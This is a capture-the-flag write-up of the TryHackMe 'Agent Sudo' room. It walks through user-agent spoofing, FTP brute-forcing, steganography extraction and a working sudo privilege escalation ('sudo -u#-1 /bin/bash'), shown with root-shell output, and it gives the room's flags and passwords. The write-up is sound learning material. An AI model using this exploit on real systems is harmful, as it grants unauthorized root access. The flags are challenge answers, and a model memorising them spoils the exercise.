# Report on Agent Sudo
[![Header](./assets/Header.png)](https://tryhackme.com/r/room/agentsudoctf)

# Enumiration 
1. The no of ports open -> **3**

we can see the nmap scan report in `nmap.scan`
There is a clue that user agent should be masked to `R`.
Use burpsuite to do so.
![Burpsuite](./assets/user-agent.png)
In the above picture we can see that i have changed the useragent to be `R`
we can achieve the same using `curl`
```bash
curl -A "R" -L <Ip address>
`-A` -> masks the user-agent
`-L` -> Follows Redirects
```
2. How you redirect yourself to a secret page? -> **user-agent**

Now we get to know that there are 25 employes and 26 alphebats. 
Lets bruteforce one by one 
```bash
curl -A "C" -L <IP address>
```
The above user returs some secreat..
Its the username.
refer [curl-c.txt](./files/curl-c.txt)

3. What is the agent name? -> **chris**

# Bruteforce
1. FTP password -> *refer [ftp-bruteforce](./files/ftp-bruteforce.txt)*

once am into the FTP, i have seen 3 files, got them to my host and then started ro extracte any hidden files using binwalk.
```bash
binwalk -e <filename>
```
2. Zip file password
Found hidden zip file `8072.zip`.
Its a password protedcted zip file and used john to extract the password
*refer [8072.zip](./files/8702-zip-password.txt )*

3. Steg password 
And the other file `cute-alien.jpg` -> being a jpg file, there is a prossibility to extracte stegs from the file.
I used `stegseek` to do the same 
```bash
stegseek <filename>
```
![setegseek](./assets/stegseek.png)

[output-file](./files/cute-alien.jpg.out)

```bash
stegseek cute-alien.jpg                                  [ ⚡9ms ] [ 02:26 PM ]
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "Area51"
[i] Original filename: "message.txt".
[i] Extracting to "cute-alien.jpg.out".
```
4. Who is the other agent (in full name)?

[output-file](./files/cute-alien.jpg.out)

7. SSH password

`hackerrules!`
[output-file](./files/cute-alien.jpg.out)

# Flag

1. User flag
**b03d975e8c92a7c04146cfa7a5a313c7**

2. What is the incident of the photo called? 
**roswell alien autopsy**

# Privilege escalation

```Check for the user sudo permissions

sudo -l 

User hacker may run the following commands on kali:
    (ALL, !root) /bin/bash


So user hacker can't run /bin/bash as root (!root)


User hacker sudo privilege in /etc/sudoers

`# User privilege specification`
root    ALL=(ALL:ALL) ALL

hacker ALL=(ALL,!root) /bin/bash


With ALL specified, user hacker can run the binary /bin/bash as any user

EXPLOIT: 

sudo -u#-1 /bin/bash
the above command will try to execute the /bin/bash using the username of the `-1`
Example : 

hacker@kali:~$ sudo -u#-1 /bin/bash
root@kali:/home/hacker# id
uid=0(root) gid=1000(hacker) groups=1000(hacker)
root@kali:/home/hacker#

Description :
Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
-u#-1 returns as 0 which is root's id

and /bin/bash is executed with root permission
```
1. CVE number for the escalation 
[Exploit-db](https://www.exploit-db.com/exploits/47502)

2. What is the root flag?
**b53a02f55b57d4439e3341834d70c062**

3. (Bonus) Who is Agent R?
**DesKel**
